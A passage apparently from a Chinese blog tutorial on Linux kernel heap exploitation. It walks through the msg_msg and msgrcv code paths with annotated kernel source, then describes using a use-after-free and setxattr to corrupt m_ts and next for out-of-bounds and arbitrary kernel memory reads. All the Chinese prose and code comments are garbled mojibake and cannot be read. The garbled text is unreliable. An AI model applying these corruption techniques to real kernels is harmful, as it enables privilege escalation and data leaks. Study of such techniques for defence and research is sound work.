(copy_from_user(msg + <span class="number">1</span>, src, alen))</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»</span></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line">			<span class="keyword">goto</span> out_err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-4"   >
          <a href="#â‘¡é‡Šæ”¾-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-4" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)-&gt;SYS_msgrcv()-&gt;ksys_msgrcv()-&gt;do_msgrcv()-&gt;do_msg_fill()-&gt;store_msg()</span><br></pre></td></tr></table></div></figure>

<p>é¦–å…ˆå…³æ³¨ä¸€ä¸‹<code>do_msgrcv()</code>å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> __user *buf, <span class="keyword">size_t</span> bufsz, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msgflg,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">long</span> (*msg_handler)(<span class="keyword">void</span> __user *, struct msg_msg *, <span class="keyword">size_t</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mode;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">copy</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    DEFINE_WAKE_Q(wake_q);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (msqid &lt; <span class="number">0</span> || (<span class="keyword">long</span>) bufsz &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">        <span class="comment">//ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™</span></span><br><span class="line">        <span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="comment">//è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg</span></span><br><span class="line">        <span class="comment">//ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†</span></span><br><span class="line">        <span class="comment">//ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰</span></span><br><span class="line">        copy = prepare_copy(buf, <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            struct msg_msg *copy;</span></span><br><span class="line"><span class="comment">            </span></span><br><span class="line"><span class="comment">            copy = load_msg(buf, bufsz);</span></span><br><span class="line"><span class="comment">            if (!IS_ERR(copy))</span></span><br><span class="line"><span class="comment">                copy-&gt;m_ts = bufsz;</span></span><br><span class="line"><span class="comment">            return copy;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤</span></span><br><span class="line">    <span class="comment">//åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//.....</span></span><br><span class="line">        msg = find_msg(msq, &amp;msgtyp, mode);</span><br><span class="line">        <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Found a suitable message.</span></span><br><span class="line"><span class="comment">			 * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†</span></span><br><span class="line">            <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">                msg = ERR_PTR(-E2BIG);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">			 * not update queue parameters.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">            <span class="comment">//è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg</span></span><br><span class="line">            <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">                <span class="comment">//è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª</span></span><br><span class="line">                msg = copy_msg(msg, copy);</span><br><span class="line">                <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†</span></span><br><span class="line">            list_del(&amp;msg-&gt;m_list);</span><br><span class="line">            msq-&gt;q_qnum--;</span><br><span class="line">            msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">            ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">            msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">            atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">            atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">            ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">    ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">    wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">    rcu_read_unlock();</span><br><span class="line">    <span class="comment">//å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—</span></span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">        free_copy(copy);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶</span></span><br><span class="line">    bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">    <span class="comment">//æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾</span></span><br><span class="line">    free_msg(msg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h5 id="A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"   >
          <a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–" class="headerlink" title="A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–"></a>A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</h5>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>msg_msg</code>è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ<code>MSG_COPY</code>è¿™ä¸ª<code>msgflg</code>æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„<code>unlink</code>è§¦å‘é”™è¯¯ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„</span></span><br><span class="line"><span class="comment">/* If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">    * not update queue parameters.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">    msg = copy_msg(msg, copy);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„</span></span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line">msq-&gt;q_qnum--;</span><br><span class="line">msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®<code>CONFIG_CHECKPOINT_RESTORE=y</code>æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">copy_msg</span><span class="params">(struct msg_msg *src, struct msg_msg *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(-ENOSYS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>ğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„<code>v5.11</code>ä¸­ï¼Œ<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº<code>copy_msg()</code>å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png" alt="image-20220512163536660"></p>
<p>æ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–<code>rdi(msg)</code>å’Œ<code>rsi(copy)</code>å¯¹åº”çš„<code>m_ts</code>è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ<code>copy</code>çš„<code>m_ts</code>æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„<code>msg</code>çš„<code>m_ts</code>é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚</p>

        <h5 id="B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"   >
          <a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–" class="headerlink" title="B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–"></a>B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</h5>
      <p>åŒç†å¦‚æœä¸æŒ‡å®š<code>MSG_COPY</code>è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>mtype</code>å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„<code>msgtpy</code>æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚</p>

        <h5 id="C-æ•°æ®å¤åˆ¶"   >
          <a href="#C-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-æ•°æ®å¤åˆ¶" class="headerlink" title="C.æ•°æ®å¤åˆ¶"></a>C.æ•°æ®å¤åˆ¶</h5>
      <p>ä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦<code>size</code>å°äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„<code>m_ts</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨-1"   >
          <a href="#3-åˆ©ç”¨-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨-1" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="è¶Šç•Œè¯»å–"   >
          <a href="#è¶Šç•Œè¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¶Šç•Œè¯»å–" class="headerlink" title="è¶Šç•Œè¯»å–"></a>è¶Šç•Œè¯»å–</h4>
      <p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„<code>double-free/UAF</code>ï¼Œå¹¶ä¸”å†ä½¿ç”¨<code>setxattr</code>æ¥å¯¹<code>msg_msgmsg</code>ä¸­çš„<code>m_ts</code>è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨<code>msgrcv</code>çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚</p>
<p><strong>ä½¿ç”¨<code>setxattr</code>çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·</strong></p>
<p>ä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª<code>msg_queue</code>å’Œå•ä¸ª<code>msg_msg</code>çš„å†…å­˜æ¨¡å‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>å¯ä»¥çœ‹åˆ°å•ä¸ª<code>msg_msg</code>åœ¨<code>msg_queue</code>çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡<code>msgget</code>å’Œ<code>msgsnd</code>å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“çš„<code>msg_queue</code>ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª<code>msg_msg</code>çš„å¤´éƒ¨äº†</p>
<p>è€Œå•ä¸ª<code>msg_msg</code>ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘<code>msg_queue</code>çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º<code>msg_queue</code>çš„å †åœ°å€äº†ã€‚</p>

        <h4 id="ä»»æ„è¯»å–"   >
          <a href="#ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„è¯»å–" class="headerlink" title="ä»»æ„è¯»å–"></a>ä»»æ„è¯»å–</h4>
      <p>å®Œæˆä¸Šè¿°æ³„éœ²<code>msg_queue</code>çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°<code>msg_msg</code>çš„å†…å­˜å¸ƒå±€äº†</p>
<p>ç”±äºæˆ‘ä»¬çš„<code>msg_msg</code>æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>ç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>next</code>æŒ‡é’ˆå’Œ<code>m_ts</code>ï¼Œç»“åˆè¯»å–<code>msg</code>æœ€ç»ˆè°ƒç”¨å‡½æ•°<code>store_msg</code>çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚</p>
